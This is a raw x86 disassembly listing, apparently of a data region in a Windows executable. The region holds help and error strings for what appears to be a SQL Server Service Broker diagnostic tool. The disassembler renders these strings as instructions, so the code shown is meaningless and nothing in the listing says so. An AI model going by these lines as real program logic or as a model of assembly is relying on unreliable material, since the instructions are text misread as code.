  403edf:	outs   dx,BYTE PTR ds:[esi]
  403ee0:	retf   
  403ee1:	add    BYTE PTR [eax],al
  403ee3:	add    BYTE PTR [ecx],bl
  403ee5:	add    DWORD PTR [eax],eax
  403ee7:	add    BYTE PTR [ebx+0x0],ch
  403eea:	add    BYTE PTR [eax],al
  403eec:	inc    edx
  403eed:	add    BYTE PTR [eax],al
  403eef:	add    BYTE PTR [eax],al
  403ef1:	add    BYTE PTR [eax],al
  403ef3:	add    dl,bh
  403ef5:	add    BYTE PTR [eax],al
  403ef7:	add    BYTE PTR [edx],bh
  403ef9:	add    DWORD PTR [eax],eax
  403efb:	add    BYTE PTR [edi],ah
  403efd:	add    BYTE PTR [eax],al
  403eff:	add    BYTE PTR [eax+eax*1+0x25f0000],ah
  403f06:	add    BYTE PTR [eax],al
  403f08:	and    al,BYTE PTR [edx+0x0]
  403f0b:	inc    ecx
  403f0c:	add    BYTE PTR [eax+eax*1+0x41],al
  403f10:	add    BYTE PTR [edx+0x0],dl
  403f13:	inc    edi
  403f14:	add    BYTE PTR [ebp+0x0],dl
  403f17:	dec    ebp
  403f18:	add    BYTE PTR [ebp+0x0],al
  403f1b:	push   esp
  403f1c:	add    BYTE PTR [edi+0x0],bl
  403f1f:	inc    esp
  403f20:	add    BYTE PTR [edx+0x0],al
  403f23:	dec    esi
  403f24:	add    BYTE PTR [ecx+0x0],al
  403f27:	dec    ebp
  403f28:	add    BYTE PTR [ebp+0x0],al
  403f2b:	add    BYTE PTR [eax],al
  403f2d:	add    BYTE PTR [eax],al
  403f2f:	push   ss
  403f30:	inc    ebp
  403f31:	add    BYTE PTR [esi+0x0],dl
  403f34:	inc    ebp
  403f35:	add    BYTE PTR [esi+0x0],cl
  403f38:	push   esp
  403f39:	add    BYTE PTR [ebx+0x0],dl
  403f3c:	inc    ebx
  403f3d:	add    BYTE PTR [edi+0x0],cl
  403f40:	push   ebp
  403f41:	add    BYTE PTR [esi+0x0],cl
  403f44:	push   esp
  403f45:	add    BYTE PTR [edi],ch
  403f47:	add    BYTE PTR [eax],al
  403f49:	add    BYTE PTR [eax*2+0x45005600],ah
  403f50:	add    BYTE PTR [esi+0x0],cl
  403f53:	push   esp
  403f54:	add    BYTE PTR [ebx+0x0],dl
  403f57:	inc    ebx
  403f58:	add    BYTE PTR [edi+0x0],cl
  403f5b:	push   ebp
  403f5c:	add    BYTE PTR [esi+0x0],cl
  403f5f:	push   esp
  403f60:	add    BYTE PTR [ecx+0x0],cl
  403f63:	inc    edi
  403f64:	add    BYTE PTR [esi+0x0],cl
  403f67:	dec    edi
  403f68:	add    BYTE PTR [edx+0x0],dl
  403f6b:	inc    ebp
  403f6c:	add    BYTE PTR [eax+eax*1+0x49],al
  403f70:	add    BYTE PTR [eax],al
  403f72:	add    BYTE PTR [eax+ecx*2],dh
  403f75:	add    BYTE PTR [ebp+0x0],al
  403f78:	dec    esp
  403f79:	add    BYTE PTR [eax+0x0],dl
  403f7c:	push   esp
  403f7d:	add    BYTE PTR [ebp+0x0],al
  403f80:	pop    eax
  403f81:	add    BYTE PTR [eax+eax*1+0x5f],dl
  403f85:	add    BYTE PTR [ebx+0x0],al
  403f88:	push   ebp
  403f89:	add    BYTE PTR [eax+eax*1+0x54],cl
  403f8d:	add    BYTE PTR [ebp+0x0],dl
  403f90:	push   edx
  403f91:	add    BYTE PTR [ebp+0x0],al
  403f94:	pop    edi
  403f95:	add    BYTE PTR [eax+eax*1+0x45],al
  403f99:	add    BYTE PTR [eax+0x0],dl
  403f9c:	inc    ebp
  403f9d:	add    BYTE PTR [esi+0x0],cl
  403fa0:	inc    esp
  403fa1:	add    BYTE PTR [ebp+0x0],al
  403fa4:	dec    esi
  403fa5:	add    BYTE PTR [eax+eax*1+0x71],dl
  403fa9:	add    BYTE PTR [eax],al
  403fab:	add    BYTE PTR [edx],ah
  403fad:	dec    ecx
  403fae:	add    BYTE PTR [esi+0x0],cl
  403fb1:	push   esp
  403fb2:	add    BYTE PTR [ebp+0x0],al
  403fb5:	push   edx
  403fb6:	add    BYTE PTR [esi+0x0],cl
  403fb9:	inc    ecx
  403fba:	add    BYTE PTR [eax+eax*1+0x45],cl
  403fbe:	add    BYTE PTR [eax+0x0],bl
  403fc1:	inc    ebx
  403fc2:	add    BYTE PTR [ebp+0x0],al
  403fc5:	push   eax
  403fc6:	add    BYTE PTR [eax+eax*1+0x49],dl
  403fca:	add    BYTE PTR [edi+0x0],cl
  403fcd:	dec    esi
  403fce:	add    BYTE PTR [esi],dl
  403fd0:	sbb    al,BYTE PTR [eax]
  403fd2:	add    BYTE PTR [edx],ch
  403fd4:	dec    ecx
  403fd5:	add    BYTE PTR [esi+0x0],cl
  403fd8:	push   esp
  403fd9:	add    BYTE PTR [ebp+0x0],al
  403fdc:	push   edx
  403fdd:	add    BYTE PTR [esi+0x0],cl
  403fe0:	inc    ecx
  403fe1:	add    BYTE PTR [eax+eax*1+0x45],cl
  403fe5:	add    BYTE PTR [eax+0x0],bl
  403fe8:	inc    ebx
  403fe9:	add    BYTE PTR [ebp+0x0],al
  403fec:	push   eax
  403fed:	add    BYTE PTR [eax+eax*1+0x49],dl
  403ff1:	add    BYTE PTR [edi+0x0],cl
  403ff4:	dec    esi
  403ff5:	add    BYTE PTR [edi+0x0],bl
  403ff8:	push   ebx
  403ff9:	add    BYTE PTR [ecx+0x0],dl
  403ffc:	dec    esp
  403ffd:	add    BYTE PTR [ebx],bh
  403fff:	sbb    al,BYTE PTR [eax]
  404001:	add    BYTE PTR [edx],bl
  404003:	dec    ebp
  404004:	add    BYTE PTR [ecx+0x0],cl
  404007:	push   ebx
  404008:	add    BYTE PTR [ebx+0x0],dl
  40400b:	dec    ecx
  40400c:	add    BYTE PTR [esi+0x0],cl
  40400f:	inc    edi
  404010:	add    BYTE PTR [edi+0x0],cl
  404013:	push   eax
  404014:	add    BYTE PTR [eax+eax*1+0x49],dl
  404018:	add    BYTE PTR [edi+0x0],cl
  40401b:	dec    esi
  40401c:	add    BYTE PTR [eax+0x1a],bh
  40401f:	add    BYTE PTR [eax],al
  404021:	sbb    al,0x50
  404023:	add    BYTE PTR [ecx+0x0],al
  404026:	push   ebx
  404027:	add    BYTE PTR [ebx+0x0],dl
  40402a:	push   edi
  40402b:	add    BYTE PTR [edi+0x0],cl
  40402e:	push   edx
  40402f:	add    BYTE PTR [eax+eax*1+0x50],al
  404033:	add    BYTE PTR [edx+0x0],dl
  404036:	dec    edi
  404037:	add    BYTE PTR [ebp+0x0],cl
  40403a:	push   eax
  40403b:	add    BYTE PTR [eax+eax*1-0x69],dl
  40403f:	sbb    al,BYTE PTR [eax]
  404041:	add    BYTE PTR [edx*2+0x52004e00],ah
  404048:	add    BYTE PTR [ebp+0x0],al
  40404b:	inc    ebx
  40404c:	add    BYTE PTR [edi+0x0],cl
  40404f:	inc    edi
  404050:	add    BYTE PTR [esi+0x0],cl
  404053:	dec    ecx
  404054:	add    BYTE PTR [edx+0x0],bl
  404057:	inc    ebp
  404058:	add    BYTE PTR [eax+eax*1+0x4f],al
  40405c:	add    BYTE PTR [eax+0x0],dl
  40405f:	push   esp
  404060:	add    BYTE PTR [ecx+0x0],cl
  404063:	dec    edi
  404064:	add    BYTE PTR [esi+0x0],cl
  404067:	mov    ebx,0x100001a
  40406c:	sub    eax,0x6c756f43
  404071:	and    BYTE PTR fs:[esi+0x6f],ch
  404075:	je     0x404097
  404077:	imul   bp,WORD PTR [esi+0x64],0x7420
  40407d:	push   0x61642065
  404082:	je     0x4040e5
  404084:	bound  esp,QWORD PTR [ecx+0x73]
  404087:	and    BYTE PTR gs:[ebx+0x30],bh
  40408b:	jge    0x4040ad
  40408d:	outs   dx,DWORD PTR ds:[esi]
  40408e:	outs   dx,BYTE PTR ds:[esi]
  40408f:	and    BYTE PTR [ebx+0x65],dh
  404092:	jb     0x40410a
  404094:	gs jb  0x4040b7
  404097:	jnp    0x4040ca
  404099:	jge    0x40409c
  40409b:	sbb    BYTE PTR [ebx+0x30],bh
  40409e:	jge    0x4040c0
  4040a0:	inc    ebp
  4040a1:	jb     0x404115
  4040a3:	outs   dx,DWORD PTR ds:[esi]
  4040a4:	jb     0x404119
  4040a6:	sub    al,0x20
  4040a8:	jnp    0x4040db
  4040aa:	jge    0x4040cc
  4040ac:	push   edi
  4040ad:	popa   
  4040ae:	jb     0x40411e
  4040b0:	imul   ebp,DWORD PTR [esi+0x67],0x7b260173
  4040b7:	xor    BYTE PTR [ebp+0x20],bh
  4040ba:	inc    ebp
  4040bb:	jb     0x40412f
  4040bd:	outs   dx,DWORD PTR ds:[esi]
  4040be:	jb     0x404133
  4040c0:	sub    al,0x20
  4040c2:	jnp    0x4040f5
  4040c4:	jge    0x4040e6
  4040c6:	push   edi
  4040c7:	popa   
  4040c8:	jb     0x404138
  4040ca:	imul   ebp,DWORD PTR [esi+0x67],0x7b202c73
  4040d1:	xor    bh,BYTE PTR [ebp+0x20]
  4040d4:	dec    ecx
  4040d5:	outs   dx,BYTE PTR ds:[si]
  4040d7:	outs   dx,DWORD PTR ds:[esi]
  4040d8:	jb     0x40413f
  4040da:	and    BYTE PTR fs:[ecx],al
  4040dd:	mov    ds:0x65685433,al
  4040e2:	and    BYTE PTR [ebx+0x73],dh
  4040e5:	bound  esp,QWORD PTR [ecx+ebp*2+0x61]
  4040e9:	outs   dx,BYTE PTR ds:[si]
  4040eb:	outs   dx,DWORD PTR ds:[esi]
  4040ec:	jae    0x404153
  4040ee:	and    BYTE PTR [ebp+0x74],dh
  4040f1:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x65722079
  4040f9:	jo     0x40416a
  4040fb:	jb     0x404171
  4040fd:	jae    0x40411f
  4040ff:	imul   esi,DWORD PTR [ebx+0x73],0x20736575
  404106:	imul   ebp,DWORD PTR [esi+0x20],0x204c5153
  40410d:	push   ebx
  40410e:	gs jb  0x404187
  404111:	gs jb  0x404134
  404114:	push   ebx
  404115:	gs jb  0x40418e
  404118:	imul   esp,DWORD PTR [ebx+0x65],0x6f724220
  40411f:	imul   esp,DWORD PTR [ebp+0x72],0xd
  404123:	or     ah,BYTE PTR [ebx+0x6f]
  404126:	outs   dx,BYTE PTR ds:[esi]
  404127:	jbe    0x40418e
  404129:	jb     0x40419e
  40412b:	popa   
  40412c:	je     0x404197
  40412e:	outs   dx,DWORD PTR ds:[esi]
  40412f:	outs   dx,BYTE PTR ds:[esi]
  404130:	jae    0x40415e
  404132:	and    BYTE PTR [edi+0x72],ch
  404135:	and    BYTE PTR [ecx+0x6e],ch
  404138:	and    BYTE PTR [eax+ebp*2+0x65],dh
  40413c:	and    BYTE PTR [ebx+0x6f],ah
  40413f:	outs   dx,BYTE PTR ds:[esi]
  404140:	imul   sp,WORD PTR [edi+0x75],0x6172
  404146:	je     0x4041b1
  404148:	outs   dx,DWORD PTR ds:[esi]
  404149:	outs   dx,BYTE PTR ds:[esi]
  40414a:	jae    0x40416c
  40414c:	outs   dx,DWORD PTR ds:[esi]
  40414d:	data16 and BYTE PTR [ebx+0x65],dl
  404151:	jb     0x4041c9
  404153:	imul   esp,DWORD PTR [ebx+0x65],0x6f724220
  40415a:	imul   esp,DWORD PTR [ebp+0x72],0x20
  40415e:	jae    0x4041c5
  404160:	jb     0x4041d8
  404162:	imul   esp,DWORD PTR [ebx+0x65],0xa0d2e73
  404169:	inc    ebx
  40416a:	outs   dx,DWORD PTR ds:[esi]
  40416b:	outs   dx,BYTE PTR ds:[esi]
  40416c:	imul   sp,WORD PTR [edi+0x75],0x6172
  404172:	je     0x4041dd
  404174:	outs   dx,DWORD PTR ds:[esi]
  404175:	outs   dx,BYTE PTR ds:[esi]
  404176:	and    BYTE PTR [ebx+0x68],ah
  404179:	arpl   WORD PTR gs:[ebx+0x73],bp
  40417d:	and    BYTE PTR [ebx+0x61],ah
  404180:	outs   dx,BYTE PTR ds:[esi]
  404181:	and    BYTE PTR [edx+0x65],ah
  404184:	and    BYTE PTR [ebp+0x61],ch
  404187:	fs and BYTE PTR gs:[esi+0x6f],ah
  40418c:	jb     0x4041ae
  40418e:	popa   
  40418f:	and    BYTE PTR [ebx+0x69],dh
  404192:	outs   dx,BYTE PTR ds:[esi]
  404193:	ins    BYTE PTR es:[di],dx
  404195:	and    BYTE PTR gs:[ebx+0x65],dh
  404199:	jb     0x404211
  40419b:	imul   esp,DWORD PTR [ebx+0x65],0x20726f20
  4041a2:	je     0x40421b
  4041a4:	outs   dx,DWORD PTR ds:[esi]
  4041a5:	and    BYTE PTR [ebx+0x65],dh
  4041a8:	jb     0x404220
  4041aa:	imul   esp,DWORD PTR [ebx+0x65],0xa0d2e73
  4041b1:	inc    ecx
  4041b2:	outs   dx,BYTE PTR ds:[esi]
  4041b3:	jns    0x4041d5
  4041b5:	gs jb  0x40422a
  4041b8:	outs   dx,DWORD PTR ds:[esi]
  4041b9:	jb     0x40422e
  4041bb:	and    BYTE PTR [esi+0x6f],ah
  4041be:	jne    0x40422e
  4041c0:	and    BYTE PTR fs:[ecx+0x72],ah
  4041c4:	and    BYTE PTR gs:[edx+0x65],dh
  4041c8:	jo     0x404239
  4041ca:	jb     0x404240
  4041cc:	gs and BYTE PTR fs:[ebp+0x69],ah
  4041d1:	je     0x40423b
  4041d3:	gs jb  0x4041f6
  4041d6:	imul   ebp,DWORD PTR [esi+0x20],0x20656874
  4041dd:	arpl   WORD PTR [edi+0x6d],bp
  4041e0:	ins    DWORD PTR es:[edi],dx
  4041e1:	popa   
  4041e2:	outs   dx,BYTE PTR ds:[esi]
  4041e3:	and    BYTE PTR fs:[eax+0x72],dh
  4041e7:	outs   dx,DWORD PTR ds:[esi]
  4041e8:	ins    DWORD PTR es:[edi],dx
  4041e9:	jo     0x40425f
  4041eb:	and    BYTE PTR [edi+0x69],dh
  4041ee:	outs   dx,BYTE PTR ds:[esi]
  4041ef:	outs   dx,DWORD PTR fs:[esi]
  4041f1:	ja     0x404213
  4041f3:	imul   ebp,DWORD PTR [esi+0xd],0x6d75680a
  4041fa:	popa   
  4041fb:	outs   dx,BYTE PTR ds:[esi]
  4041fc:	sub    eax,0x64616572
  404201:	popa   
  404202:	bound  ebp,QWORD PTR [ebp+eiz*2+0x20]
  404206:	je     0x40426d
  404208:	js     0x40427e
  40420a:	sub    al,0x20
  40420c:	outs   dx,DWORD PTR ds:[esi]
  40420d:	jb     0x40422f
  40420f:	imul   ebp,DWORD PTR [esi+0x20],0x6d726f66
  404216:	popa   
  404217:	je     0x40428d
  404219:	gs and BYTE PTR fs:[eax+0x4d],bl
  40421e:	dec    esp
  40421f:	and    BYTE PTR [eax+ebp*2+0x61],dh
  404223:	je     0x404245
  404225:	arpl   WORD PTR [ecx+0x6e],sp
  404228:	and    BYTE PTR [edx+0x65],ah
  40422b:	and    BYTE PTR [edx+0x65],dh
  40422e:	imul   esi,DWORD PTR fs:[edx+0x65],0x64657463
  404236:	and    BYTE PTR [edi+ebp*2+0x20],dh
  40423a:	popa   
  40423b:	and    BYTE PTR [esi+0x69],ah
  40423e:	ins    BYTE PTR es:[edi],dx
  40423f:	gs or  eax,0x20726f0a
  404245:	popa   
  404246:	outs   dx,BYTE PTR ds:[esi]
  404247:	outs   dx,DWORD PTR ds:[esi]
  404248:	je     0x4042b2
  40424a:	gs jb  0x40426d
  40424d:	popa   
  40424e:	jo     0x4042c0
  404250:	ins    BYTE PTR es:[edi],dx
  404251:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  404258:	cs or  eax,0x2d0a0d0a
  40425e:	pop    eax
  40425f:	dec    ebp
  404260:	dec    esp
  404261:	or     DWORD PTR [ecx],ecx
  404263:	or     DWORD PTR [ecx],ecx
  404265:	push   ebx
  404266:	jo     0x4042cd
  404268:	arpl   WORD PTR [ecx+0x66],bp
  40426b:	imul   esp,DWORD PTR [ebp+0x73],0x6e656720
  404272:	gs jb  0x4042d6
  404275:	je     0x4042e0
  404277:	outs   dx,BYTE PTR ds:[esi]
  404278:	and    BYTE PTR [si+0x68],dh
  40427c:	and    BYTE PTR gs:[edi+0x75],ch
  404280:	je     0x4042f2
  404282:	jne    0x4042f8
  404284:	and    BYTE PTR [ecx+0x73],ah
  404287:	and    BYTE PTR [ecx+0x6e],ah
  40428a:	and    BYTE PTR [eax+0x4d],bl
  40428d:	dec    esp
  40428e:	and    BYTE PTR [esi+0x69],ah
  404291:	ins    BYTE PTR es:[edi],dx
  404292:	gs or  eax,0x909090a
  404298:	or     DWORD PTR [eax+ebp*2+0x61],esi
  40429c:	je     0x4042be
  40429e:	arpl   WORD PTR [ecx+0x6e],sp
  4042a1:	and    BYTE PTR [edx+0x65],ah
  4042a4:	and    BYTE PTR [edx+0x65],dh
  4042a7:	imul   esi,DWORD PTR fs:[edx+0x65],0x64657463
  4042af:	and    BYTE PTR [edi+ebp*2+0x20],dh
  4042b3:	popa   
  4042b4:	and    BYTE PTR [esi+0x69],ah
  4042b7:	ins    BYTE PTR es:[edi],dx
  4042b8:	and    BYTE PTR gs:[edi+0x72],ch
  4042bc:	and    BYTE PTR [ecx+0x6e],ah
  4042bf:	outs   dx,DWORD PTR ds:[esi]
  4042c0:	je     0x40432a
  4042c2:	gs jb  0x4042d2
  4042c5:	or     cl,BYTE PTR [ecx]
  4042c7:	or     DWORD PTR [ecx],ecx
  4042c9:	or     DWORD PTR [ecx+0x70],esp
  4042cc:	jo     0x40433a
  4042ce:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4042d5:	and    BYTE PTR cs:[ecx+0x66],cl
  4042d9:	and    BYTE PTR ds:0x204c4d58,ch
  4042df:	imul   esi,DWORD PTR [ebx+0x20],0x20746f6e
  4042e6:	jae    0x404358
  4042e8:	arpl   WORD PTR gs:[ecx+0x66],bp
  4042ec:	imul   esp,DWORD PTR [ebp+0x64],0x6874202c
  4042f3:	gs or  eax,0x909090a
  4042f9:	or     DWORD PTR [edi+0x75],ebp
  4042fc:	je     0x40436e
  4042fe:	jne    0x404374
  404300:	and    BYTE PTR [ecx+0x73],ch
  404303:	and    BYTE PTR [ecx+ebp*2+0x73],ah
  404307:	jo     0x404375
  404309:	popa   
  40430a:	jns    0x404371
  40430c:	and    BYTE PTR fs:[ecx+0x6e],ch
  404310:	and    BYTE PTR [eax+ebp*2+0x65],dh
  404314:	and    BYTE PTR [ebx+0x6f],ah
  404317:	ins    DWORD PTR es:[edi],dx
  404318:	ins    DWORD PTR es:[edi],dx
  404319:	popa   
  40431a:	outs   dx,BYTE PTR ds:[esi]
  40431b:	and    BYTE PTR fs:[eax+0x72],dh
  40431f:	outs   dx,DWORD PTR ds:[esi]
  404320:	ins    DWORD PTR es:[edi],dx
  404321:	jo     0x404397
  404323:	or     eax,0x909090a
  404328:	or     DWORD PTR [edi+0x69],esi
  40432b:	outs   dx,BYTE PTR ds:[esi]
  40432c:	outs   dx,DWORD PTR fs:[esi]
  40432e:	ja     0x40435e
  404330:	or     eax,0x2d0a0d0a
  404335:	dec    esp
  404336:	inc    ebp
  404337:	push   esi
  404338:	inc    ebp
  404339:	dec    esp
  40433a:	or     DWORD PTR [ebp+0x52],eax
  40433d:	push   edx
  40433e:	dec    edi
  40433f:	push   edx
  404340:	or     DWORD PTR [ecx],ecx
  404342:	or     DWORD PTR [ecx+ebp*2+0x73],eax
  404346:	jo     0x4043b4
  404348:	popa   
  404349:	jns    0x40436b
  40434b:	outs   dx,DWORD PTR ds:[esi]
  40434c:	outs   dx,BYTE PTR ds:[esi]
  40434d:	ins    BYTE PTR es:[edi],dx
  40434e:	jns    0x404370
  404350:	gs jb  0x4043c5
  404353:	outs   dx,DWORD PTR ds:[esi]
  404354:	jb     0x404376
  404356:	ins    DWORD PTR es:[edi],dx
  404357:	gs jae 0x4043cd
  40435a:	popa   
  40435b:	addr16 gs jae 0x40438d
  40435f:	or     eax,0x4157090a
  404364:	push   edx
  404365:	dec    esi
  404366:	dec    ecx
  404367:	dec    esi
  404368:	inc    edi
  404369:	or     DWORD PTR [ecx],ecx
  40436b:	or     DWORD PTR [ecx+ebp*2+0x73],eax
  40436f:	jo     0x4043dd
  404371:	popa   
  404372:	jns    0x404394
  404374:	gs jb  0x4043e9
  404377:	outs   dx,DWORD PTR ds:[esi]
  404378:	jb     0x40439a
  40437a:	popa   
  40437b:	outs   dx,BYTE PTR ds:[esi]
  40437c:	and    BYTE PTR fs:[edi+0x61],dh
  404380:	jb     0x4043f0
  404382:	imul   ebp,DWORD PTR [esi+0x67],0x73656d20
  404389:	jae    0x4043ec
  40438b:	addr16 gs jae 0x4043af
  40438f:	sub    BYTE PTR [ebp+eiz*2+0x66],ah
  404393:	popa   
  404394:	jne    0x404402
  404396:	je     0x4043c1
  404398:	cs or  eax,0x4e49090a
  40439e:	inc    esi
  40439f:	dec    edi
  4043a0:	or     DWORD PTR [ecx],ecx
  4043a2:	or     DWORD PTR [ecx+ebp*2+0x73],eax
  4043a6:	jo     0x404414
  4043a8:	popa   
  4043a9:	jns    0x4043cb
  4043ab:	gs jb  0x404420
  4043ae:	outs   dx,DWORD PTR ds:[esi]
  4043af:	jb     0x4043dd
  4043b1:	and    BYTE PTR [edi+0x61],dh
  4043b4:	jb     0x404424
  4043b6:	imul   ebp,DWORD PTR [esi+0x67],0x6e61202c
  4043bd:	and    BYTE PTR fs:[ecx+0x6e],ch
  4043c1:	outs   dx,WORD PTR ds:[esi]
  4043c3:	jb     0x404432
  4043c5:	popa   
  4043c6:	je     0x404431
  4043c8:	outs   dx,DWORD PTR ds:[esi]
  4043c9:	outs   dx,BYTE PTR ds:[esi]
  4043ca:	popa   
  4043cb:	ins    BYTE PTR es:[edi],dx
  4043cc:	or     eax,0x909090a
  4043d1:	or     DWORD PTR [ebp+0x65],ebp
  4043d4:	jae    0x404449
  4043d6:	popa   
  4043d7:	addr16 gs jae 0x404409
  4043db:	or     eax,0x2d0a0d0a
  4043e0:	dec    ecx
  4043e1:	inc    edi
  4043e2:	dec    esi
  4043e3:	dec    edi
  4043e4:	push   edx
  4043e5:	inc    ebp
  4043e6:	and    BYTE PTR [ebp+0x72],ah
  4043e9:	jb     0x40445a
  4043eb:	jb     0x40444c
  4043ed:	imul   esp,DWORD PTR [eax+eiz*1+0x20],0x20202020
  4043f5:	and    BYTE PTR [eax],ah
  4043f7:	and    BYTE PTR [eax],ah
  4043f9:	and    BYTE PTR [eax],ah
  4043fb:	and    BYTE PTR [eax],ah
  4043fd:	and    BYTE PTR [eax],ah
  4043ff:	push   ebx
  404400:	jo     0x404467
  404402:	arpl   WORD PTR [ecx+0x66],bp
  404405:	imul   esp,DWORD PTR [ebp+0x73],0x61687420
  40440c:	je     0x40442e
  40440e:	gs jb  0x404483
  404411:	outs   dx,DWORD PTR ds:[esi]
  404412:	jb     0x404487
  404414:	and    BYTE PTR [edi+0x72],ch
  404417:	and    BYTE PTR [ebp+0x65],ch
  40441a:	jae    0x40448f
  40441c:	popa   
  40441d:	addr16 gs jae 0x404441
  404421:	je     0x40448b
  404423:	popa   
  404424:	je     0x404446
  404426:	push   0xd657661
  40442b:	or     ah,BYTE PTR [eax]
  40442d:	and    BYTE PTR [eax],ah
  40442f:	and    BYTE PTR [eax],ah
  404431:	and    BYTE PTR [eax],ah
  404433:	and    BYTE PTR [eax],ah
  404435:	and    BYTE PTR [eax],ah
  404437:	and    BYTE PTR [eax],ah
  404439:	and    BYTE PTR [eax],ah
  40443b:	and    BYTE PTR [eax],ah
  40443d:	and    BYTE PTR [eax],ah
  40443f:	and    BYTE PTR [eax],ah
  404441:	and    BYTE PTR [eax],ah
  404443:	and    BYTE PTR [eax],ah
  404445:	and    BYTE PTR [eax],ah
  404447:	and    BYTE PTR [eax],ah
  404449:	and    BYTE PTR [eax],ah
  40444b:	and    BYTE PTR [eax+ebp*2+0x65],dh
  40444f:	and    BYTE PTR [ebx+0x70],dh
  404452:	arpl   WORD PTR gs:[ecx+0x66],bp
  404456:	imul   esp,DWORD PTR [ebp+0x64],0x72726520
  40445d:	outs   dx,DWORD PTR ds:[esi]
  40445e:	jb     0x404480
  404460:	dec    ecx
  404461:	inc    esp
  404462:	and    BYTE PTR [esi+0x6f],ch
  404465:	je     0x404487
  404467:	bound  esp,QWORD PTR [ebp+0x20]
  40446a:	imul   ebp,DWORD PTR [esi+0x63],0x6564756c
  404471:	and    BYTE PTR fs:[ecx+0x6e],ch
  404475:	or     eax,0x2020200a
  40447a:	and    BYTE PTR [eax],ah
  40447c:	and    BYTE PTR [eax],ah
  40447e:	and    BYTE PTR [eax],ah
  404480:	and    BYTE PTR [eax],ah
  404482:	and    BYTE PTR [eax],ah
  404484:	and    BYTE PTR [eax],ah
  404486:	and    BYTE PTR [eax],ah
  404488:	and    BYTE PTR [eax],ah
  40448a:	and    BYTE PTR [eax],ah
  40448c:	and    BYTE PTR [eax],ah
  40448e:	and    BYTE PTR [eax],ah
  404490:	and    BYTE PTR [eax],ah
  404492:	and    BYTE PTR [eax],ah
  404494:	and    BYTE PTR [eax],ah
  404496:	and    BYTE PTR [edx+0x65],dh
  404499:	jo     0x40450a
  40449b:	jb     0x404511
  40449d:	jae    0x4044cd
  40449f:	and    BYTE PTR [ecx+0x6f],bl
  4044a2:	jne    0x4044c4
  4044a4:	arpl   WORD PTR [ecx+0x6e],sp
  4044a7:	and    BYTE PTR [ebx+0x70],dh
  4044aa:	arpl   WORD PTR gs:[ecx+0x66],bp
  4044ae:	jns    0x4044d0
  4044b0:	sub    eax,0x4f4e4749
  4044b5:	push   edx
  4044b6:	inc    ebp
  4044b7:	and    BYTE PTR [ebp+0x75],ch
  4044ba:	ins    BYTE PTR es:[edi],dx
  4044bb:	je     0x404526
  4044bd:	jo     0x40452b
  4044bf:	gs or  eax,0x2020200a
  4044c5:	and    BYTE PTR [eax],ah
  4044c7:	and    BYTE PTR [eax],ah
  4044c9:	and    BYTE PTR [eax],ah
  4044cb:	and    BYTE PTR [eax],ah
  4044cd:	and    BYTE PTR [eax],ah
  4044cf:	and    BYTE PTR [eax],ah
  4044d1:	and    BYTE PTR [eax],ah
  4044d3:	and    BYTE PTR [eax],ah
  4044d5:	and    BYTE PTR [eax],ah
  4044d7:	and    BYTE PTR [eax],ah
  4044d9:	and    BYTE PTR [eax],ah
  4044db:	and    BYTE PTR [eax],ah
  4044dd:	and    BYTE PTR [eax],ah
  4044df:	and    BYTE PTR [eax],ah
  4044e1:	and    BYTE PTR [ecx+ebp*2+0x6d],dh
  4044e5:	gs jae 0x404508
  4044e8:	je     0x404559
  4044ea:	and    BYTE PTR [ebx+0x75],dh
  4044ed:	jo     0x40455f
  4044ef:	jb     0x404556
  4044f1:	jae    0x404566
  4044f3:	and    BYTE PTR [ebp+0x75],ch
  4044f6:	ins    BYTE PTR es:[edi],dx
  4044f7:	je     0x404562
  4044f9:	jo     0x404567
  4044fb:	and    BYTE PTR gs:[ebp+0x72],ah
  4044ff:	jb     0x404570
  404501:	jb     0x404523
  404503:	dec    ecx
  404504:	inc    esp
  404505:	jae    0x404535
  404507:	or     eax,0x430a0d0a
  40450c:	dec    edi
  40450d:	dec    esi
  40450e:	inc    esi
  40450f:	dec    ecx
  404510:	inc    edi
  404511:	push   ebp
  404512:	push   edx
  404513:	inc    ecx
  404514:	push   esp
  404515:	dec    ecx
  404516:	dec    edi
  404517:	dec    esi
  404518:	or     DWORD PTR [ecx],ecx
  40451a:	or     DWORD PTR [edx+0x65],edx
  40451d:	jno    0x404594
  40451f:	gs jae 0x404596
  404522:	jae    0x404544
  404524:	popa   
  404525:	and    BYTE PTR [edx+0x65],dh
  404528:	jo     0x404599
  40452a:	jb     0x4045a0
  40452c:	and    BYTE PTR [edi+0x66],ch
  40452f:	and    BYTE PTR [ecx+0x6e],ah
  404532:	jns    0x404554
  404534:	arpl   WORD PTR [edi+0x6e],bp
  404537:	imul   sp,WORD PTR [edi+0x75],0x6172
  40453d:	je     0x4045a8
  40453f:	outs   dx,DWORD PTR ds:[esi]
  404540:	outs   dx,BYTE PTR ds:[esi]
  404541:	and    BYTE PTR [ebp+0x72],ah
  404544:	jb     0x4045b5
  404546:	jb     0x4045bb
  404548:	or     eax,0x909090a
  40454d:	or     DWORD PTR [edx+0x65],esp
  404550:	je     0x4045c9
  404552:	gs outs dx,BYTE PTR gs:[esi]
  404555:	and    BYTE PTR [edi+esi*2+0x6f],dh
  404559:	and    BYTE PTR [ebx+0x65],dl
  40455c:	jb     0x4045d4
  40455e:	imul   esp,DWORD PTR [ebx+0x65],0x6f724220
  404565:	imul   esp,DWORD PTR [ebp+0x72],0x20
  404569:	jae    0x4045d0
  40456b:	jb     0x4045e3
  40456d:	imul   esp,DWORD PTR [ebx+0x65],0x6f202c73
  404574:	jb     0x404596
  404576:	outs   dx,WORD PTR ds:[esi]
  404578:	jb     0x40459a
  40457a:	popa   
  40457b:	or     eax,0x909090a
  404580:	or     DWORD PTR [ebx+0x69],esi
  404583:	outs   dx,BYTE PTR ds:[esi]
  404584:	ins    BYTE PTR es:[di],dx
  404586:	and    BYTE PTR gs:[ebx+0x65],dh
  40458a:	jb     0x404602
  40458c:	imul   esp,DWORD PTR [ebx+0x65],0xd0a0d2e
  404593:	or     cl,BYTE PTR [edi+0x4e]
  404596:	and    BYTE PTR [ebx+0x4f],al
  404599:	dec    esi
  40459a:	push   esp
  40459b:	push   edx
  40459c:	inc    ecx
  40459d:	inc    ebx
  40459e:	push   esp
  40459f:	and    BYTE PTR [ebx+0x6f],ah
  4045a2:	outs   dx,BYTE PTR ds:[esi]
  4045a3:	je     0x404617
  4045a5:	popa   
  4045a6:	arpl   WORD PTR [edi+ebx*2+0x6e],si
  4045aa:	popa   
  4045ab:	ins    DWORD PTR es:[edi],dx
  4045ac:	or     DWORD PTR gs:[edx+0x65],edx
